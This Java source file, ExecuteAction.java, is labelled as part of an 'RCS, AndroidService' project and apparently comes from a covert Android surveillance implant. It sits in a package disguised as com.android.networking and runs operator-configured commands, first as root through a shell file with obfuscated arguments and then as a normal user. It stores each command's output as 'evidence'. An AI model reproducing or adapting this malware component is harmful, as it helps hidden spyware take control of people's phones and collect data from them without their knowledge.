/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ExecuteAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.action;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.ArrayList;

import android.text.TextUtils.StringSplitter;

import com.android.networking.Messages;
import com.android.networking.Trigger;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.conf.Configuration;
import com.android.networking.conf.ConfigurationException;

import com.android.networking.evidence.EvidenceType;
import com.android.networking.file.Directory;
import com.android.networking.util.Check;
import com.android.networking.util.Execute;
import com.android.networking.util.ExecuteResult;
import com.android.networking.util.StreamGobbler;
import com.android.networking.util.WChar;

// TODO: Aggiungere parse $dir$, verificare chmod
/**
 * The Class ExecuteAction.
 */
public class ExecuteAction extends SubActionSlow {
	private static final String TAG = "ExecuteAction";

	private String command;

	

	/**
	 * Instantiates a new execute action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public ExecuteAction(final ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(final ConfAction params) {
		try {
			this.command = Directory.expandMacro(params.getString("command"));			
	
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): " + this.command);
			}
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
	
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");
			}
	
			return false;
		}
	
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		if (this.command.length() == 0)
			return false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + command);
		}
		ExecuteResult ret = Execute.execute(this.command);
		ret.saveEvidence();
		
		return ret.exitCode == 0;
	}

	public static boolean execute(String command) {
		// Proviamo ad eseguire il comando da root
		try {
			String cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35.0"), command ); // EXPORT
			ExecuteResult ret = Execute.execute(cmd);
			
			
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (root exec)");
			}
		}
		return false;
	}
	
	public static boolean executeGobbler(String command) {
		try {

			Runtime rt = Runtime.getRuntime();
			Process proc = rt.exec(command);

			// any error message?
			StreamGobbler errorGobbler = new StreamGobbler(proc.getErrorStream(), "ERR");

			// any output?
			StreamGobbler outputGobbler = new StreamGobbler(proc.getInputStream(), "OUT");

			// kick them off
			errorGobbler.start();
			outputGobbler.start();

			// any error???
			int exitVal = proc.waitFor();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (executeOutput): ExitValue: " + exitVal );
			}
		} catch (Throwable t) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (executeOutput) Error: " + t);
			}
			return false;
		}
		return true;
	}

	// TODO: execute executionLine, saving output COMMAND
	// http://www.javaworld.com/javaworld/jw-12-2000/jw-1229-traps.html?page=4
	public static boolean executeOrigin(String command) {
		// Proviamo ad eseguire il comando da root
		try {
			String cmd[] = { Configuration.shellFile, Messages.getString("35.0"), command }; // EXPORT
			Process p = Runtime.getRuntime().exec(cmd);

			p.waitFor();
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (root exec)");
			}
		}

		// Proviamo ad eseguire il comando da utente normale
		try {
			String cmd[] = { Messages.getString("35.1"), "-c", command }; // EXPORT
			Process p = Runtime.getRuntime().exec(cmd);

			p.waitFor();
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
			}
		}

		return false;
	}
}
